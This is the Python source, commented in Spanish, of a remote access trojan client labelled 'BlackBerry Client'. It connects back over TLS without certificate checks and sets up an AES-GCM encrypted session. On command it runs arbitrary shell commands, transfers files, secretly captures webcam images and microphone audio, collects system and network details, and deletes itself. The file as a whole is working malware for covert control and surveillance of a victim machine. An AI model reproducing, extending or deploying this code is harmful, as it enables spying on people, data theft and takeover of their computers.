import socket
import ssl
import os
import struct
import time
import subprocess
import hashlib
import sys
import threading
import tempfile
import io
import multiprocessing as mp
import contextlib
import platform
import getpass
import json
import shutil
import random

from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# ----------------------------------------------------------------
# Configuración
# ----------------------------------------------------------------
PROXY_HOST = 'localhost'
PROXY_PORT = 9948
TIMEOUT_INACTIVIDAD = 86400  # segundos de inactividad antes de autodestruir
last_successful_connection = time.time()

# ----------------------------------------------------------------
# Configuración de reconexión (exponencial con jitter)
# ----------------------------------------------------------------
RECONNECT_INITIAL_INTERVAL = 5     # segundos de espera inicial
RECONNECT_MAX_INTERVAL     = 300   # máximo tiempo de espera entre reintentos

# Contexto TLS de cliente (sin verificación de certificado)
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

# ----------------------------------------------------------------
# AES-GCM utils
# ----------------------------------------------------------------
def recvall(sock, n):
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data

def send_encrypted_message(sock, plaintext: str, aes_key: bytes):
    aesgcm = AESGCM(aes_key)
    nonce = os.urandom(12)
    ct = aesgcm.encrypt(nonce, plaintext.encode('utf-8'), None)
    msg = nonce + ct
    sock.sendall(struct.pack('!I', len(msg)) + msg)

def receive_encrypted_message(sock, aes_key: bytes) -> str:
    raw_len = recvall(sock, 4)
    if not raw_len:
        return None
    length = struct.unpack('!I', raw_len)[0]
    data = recvall(sock, length)
    if not data:
        return None
    nonce, ct = data[:12], data[12:]
    aesgcm = AESGCM(aes_key)
    return aesgcm.decrypt(nonce, ct, None).decode('utf-8')

# ----------------------------------------------------------------
# Banner y ayuda
# ----------------------------------------------------------------
def banner() -> str:
    usr = getpass.getuser()
    so = platform.system()
    version = platform.release()
    host = platform.node()
    machin = platform.machine()
    arct = platform.architecture()
    pythonv = platform.python_version()

    info_usr = f"{usr}@{host}"
    info_so = f"{so} {version}"
    machinc = f"{machin} {arct}"

    lines = [
        "              ,---------------------------,",
        "              |  /---------------------\\  |",
        f"              | | {info_usr:<22.22}| |",
        f"              | | {info_so:<22.22}| |",
        f"              | | {machinc:<22.22}| |",
        "              | |                       | |",
        "              | |                       | |",
        "              |  \\_____________________/  |",
        "              |___________________________|",
        "            ,---\\_____     []     _______/------,",
        "          /         /______________\\           /|",
        "        /___________________________________ /  |",
        "        | BlackBerry Client                 |    )",
        "        |  _ _ _          BlackBerry [ v1.0 ]  |   |",
       f"        |  o o o           Python [{pythonv:<5}]  |  /",
        "        |__________________________________ |/",
        "    /-------------------------------------/|",
        "  /-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /",
        "/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/ /",
        "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
    ]
    return "\n".join(lines)

HELP_TEXT = (
    "HELP             - Muestra este mensaje.\n"
    "GET_CWD          - Directorio actual.\n"
    "GET_FILE <file>  - Envía archivo al servidor.\n"
    "PUT_FILE <file>  - Recibe archivo del servidor.\n"
    "AUTO-E           - Auto-eliminación.\n"
    "CAPTURE_IMAGE    - Captura imagen (webcam).\n"
    "CAPTURE_AUDIO[n] - Captura audio [segundos].\n"
    "NETINFO          - Muestra info de red.\n"
    "SYSTEM           - Muestra info de sistema.\n"
    "Otros comandos se ejecutan en shell."
)

# ----------------------------------------------------------------
# Ejecución de comandos y transferencia
# ----------------------------------------------------------------
def execute_command(cmd: str) -> str:
    if cmd.startswith('cd '):
        try:
            os.chdir(cmd[3:].strip())
            return f"[+] Directorio: {os.getcwd()}"
        except Exception as e:
            return f"[-] {e}"
    res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return (res.stdout or res.stderr).strip() or '[+] Ejecutado.'

def send_file(sock, aes_key, fname):
    if not os.path.isfile(fname):
        return send_encrypted_message(sock, '[-] No encontrado.', aes_key)
    size = os.path.getsize(fname)
    h = hashlib.sha256()
    with open(fname, 'rb') as f:
        for chunk in iter(lambda: f.read(4096), b''):
            h.update(chunk)
    header = f"SIZE {size} {h.hexdigest()}"
    send_encrypted_message(sock, header, aes_key)
    with open(fname,'rb') as f:
        for chunk in iter(lambda: f.read(4096), b''):
            sock.sendall(chunk)

def receive_file(sock, aes_key, fname):
    hdr = receive_encrypted_message(sock, aes_key)
    if not hdr or not hdr.startswith('SIZE '):
        return '[-] Encabezado inválido.'
    _, sz, expected = hdr.split()
    data = recvall(sock, int(sz))
    if hashlib.sha256(data).hexdigest() != expected:
        return '[-] Hash mismatch.'
    with open(fname, 'wb') as f:
        f.write(data)
    send_encrypted_message(sock, f"[+] Guardado {fname}", aes_key)
    return f"[+] {fname} recibido."

# ----------------------------------------------------------------
# Captura multimedia (si están instalados)
# ----------------------------------------------------------------
def capture_image():
    try:
        import cv2
    except ImportError:
        return None, '[-] Instala opencv-python.'
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        cap.release()
        return None, '[-] No cámara.'
    ret, frame = cap.read()
    cap.release()
    if not ret:
        return None, '[-] Error captura.'
    path = os.path.join(tempfile.gettempdir(), 'capture.jpg')
    cv2.imwrite(path, frame)
    return path, '[+] Imagen lista.'

def capture_audio(sec=5):
    try:
        import pyaudio, wave
    except ImportError:
        return None, '[-] Instala pyaudio.'
    RATE, CHUNK = 44100, 1024
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16, channels=1, rate=RATE,
                    input=True, frames_per_buffer=CHUNK)
    frames = []
    for _ in range(int(RATE/CHUNK*sec)):
        frames.append(stream.read(CHUNK))
    stream.stop_stream()
    stream.close()
    p.terminate()
    path = os.path.join(tempfile.gettempdir(), 'capture.wav')
    wf = wave.open(path,'wb')
    wf.setnchannels(1)
    wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()
    return path, '[+] Audio listo.'

# ----------------------------------------------------------------
# Info de red y sistema
# ----------------------------------------------------------------
def get_network_info():
    info = []

    # 1) IP local usada para salir a Internet
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        info.append(f"IP local: {s.getsockname()[0]}")
        s.close()
    except Exception as e:
        info.append(f"IP local: error ({e})")

    # 2) Lista de interfaces y direcciones IPv4/IPv6
    info.append("\nInterfaces:")
    try:
        # ip -o addr muestra cada dirección en una línea
        out = subprocess.check_output(['ip', '-o', 'addr'], text=True)
        # Formato: "<idx>: <ifname> <family> <addr>/<mask> ..."
        for line in out.splitlines():
            parts = line.split()
            ifname = parts[1]
            family = parts[2]
            addr = parts[3]
            info.append(f"  • {ifname} ({family}): {addr}")
    except Exception as e:
        info.append(f"  • Error listando interfaces ({e})")

    # 3) Puerta de enlace por defecto
    info.append("\nPuerta de enlace por defecto:")
    try:
        out = subprocess.check_output(['ip', 'route', 'show', 'default'], text=True)
        # Busca: default via <gateway> dev <iface>
        m = re.search(r'default via (\S+) dev (\S+)', out)
        if m:
            gw, iface = m.group(1), m.group(2)
            info.append(f"  • {gw} vía {iface}")
        else:
            info.append("  • No encontrada")
    except Exception as e:
        info.append(f"  • Error obteniendo gateway ({e})")

    # 4) Servidores DNS (/etc/resolv.conf)
    info.append("\nDNS:")
    try:
        with open('/etc/resolv.conf') as f:
            for line in f:
                if line.startswith('nameserver'):
                    ns = line.split()[1]
                    info.append(f"  • {ns}")
    except Exception as e:
        info.append(f"  • Error leyendo /etc/resolv.conf ({e})")

    # 5) IP pública (consulta a ipify)
    info.append("\nIP pública:")
    try:
        with urllib.request.urlopen('https://api.ipify.org?format=json', timeout=3) as resp:
            js = json.load(resp)
            info.append(f"  • {js.get('ip')}")
    except Exception:
        info.append("  • No disponible (sin Internet o bloqueado)")

    return "\n".join(info)

def get_system_info():
    info = {
        'system': platform.system(),
        'node': platform.node(),
        'release': platform.release(),
        'version': platform.version(),
        'machine': platform.machine(),
        'processor': platform.processor()
    }
    return json.dumps(info, ensure_ascii=False)

# ----------------------------------------------------------------
# Conexión principal al proxy con backoff exponencial
# ----------------------------------------------------------------
def connect_to_proxy():
    global last_successful_connection
    backoff = RECONNECT_INITIAL_INTERVAL

    while True:
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw.connect((PROXY_HOST, PROXY_PORT))
            tls_sock = ssl_context.wrap_socket(raw, server_hostname=PROXY_HOST)
            last_successful_connection = time.time()

            # Conexión exitosa: reinicia backoff
            backoff = RECONNECT_INITIAL_INTERVAL

            # Recibe pubkey del servidor real vía proxy
            data = tls_sock.recv(4096)
            if not data.startswith(b'PUBKEY:'):
                tls_sock.close()
                continue
            server_pub = serialization.load_pem_public_key(data[len(b'PUBKEY:'):])

            # Genera AES key y la envía cifrada
            aes_key = os.urandom(32)
            enc = server_pub.encrypt(
                aes_key,
                padding.OAEP(
                    mgf=padding.MGF1(hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            tls_sock.sendall(struct.pack('!I', len(enc)) + enc)

            # Loop principal de comandos
            while True:
                msg = receive_encrypted_message(tls_sock, aes_key)
                if not msg:
                    break
                parts = msg.strip().split()
                cmd = parts[0].upper()

                if cmd == 'HELP':
                    send_encrypted_message(tls_sock, HELP_TEXT, aes_key)
                elif cmd == 'GET_CWD':
                    send_encrypted_message(tls_sock, os.getcwd(), aes_key)
                elif cmd == 'GET_FILE' and len(parts) == 2:
                    send_file(tls_sock, aes_key, parts[1])
                elif cmd == 'PUT_FILE' and len(parts) == 2:
                    receive_file(tls_sock, aes_key, parts[1])
                elif cmd == 'BANNER':
                    send_encrypted_message(tls_sock, banner(), aes_key)
                elif cmd == 'CAPTURE_IMAGE':
                    path, m = capture_image()
                    send_encrypted_message(tls_sock, m, aes_key)
                    if path:
                        send_file(tls_sock, aes_key, path)
                elif cmd == 'CAPTURE_AUDIO':
                    sec = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 5
                    path, m = capture_audio(sec)
                    send_encrypted_message(tls_sock, m, aes_key)
                    if path:
                        send_file(tls_sock, aes_key, path)
                elif cmd == 'NETINFO':
                    send_encrypted_message(tls_sock, get_network_info(), aes_key)
                elif cmd == 'SYSTEM':
                    send_encrypted_message(tls_sock, get_system_info(), aes_key)
                elif cmd == 'AUTO-E':
                    tls_sock.close()
                    os.remove(os.path.abspath(sys.argv[0]))
                    return
                else:
                    res = execute_command(msg)
                    send_encrypted_message(tls_sock, res, aes_key)

        except Exception:
            pass
        finally:
            try:
                tls_sock.close()
            except:
                pass

        # Espera antes de reintentar (backoff exponencial + jitter)
        wait_time = backoff + random.uniform(0, backoff * 0.1)
        time.sleep(wait_time)
        backoff = min(backoff * 2, RECONNECT_MAX_INTERVAL)

if __name__ == '__main__':
    connect_to_proxy()
